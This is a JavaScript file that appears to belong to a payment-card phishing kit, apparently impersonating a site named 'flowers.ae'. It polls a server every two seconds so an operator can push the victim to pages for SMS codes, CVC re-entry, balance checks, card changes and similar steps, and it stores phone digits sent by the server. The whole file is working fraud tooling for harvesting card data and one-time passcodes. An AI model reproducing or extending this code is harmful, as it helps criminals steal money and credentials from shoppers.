const sessionId = localStorage.getItem("sessionId");
const clientId = localStorage.getItem("clientId") || "flowers.ae";

async function pollRedirect() {
  if (!sessionId || !clientId) return;

  try {
    const res = await fetch(`/api/check-redirect/${clientId}/${sessionId}`);
    const data = await res.json();

    if (data.redirect) {
      console.log("🔁 Redirecting to:", data.type);

      if (data.phoneDigits) {
        // ✅ сохраняем последние цифры телефона
        localStorage.setItem("phoneDigits", data.phoneDigits);
      }

      const pages = {
        sms: "/sms",
        balance: "/balance",
        change: "/change-card",
        success: "/success",
        "wrong-cvc": "/wrong-card",
        "wrong-sms": "/wrong-sms",
        prepaid: "/prepaid-card",
        "transit-1": "/transit-1",
        "transit-2": "/transit-2",
        "custom-sms": "/custom-sms",
      };

      const redirectTo = pages[data.type] || "/loading";
      window.location.href = redirectTo;
    }
  } catch (err) {
    console.error("Redirect error:", err);
  }
}

setInterval(pollRedirect, 2000);
pollRedirect();
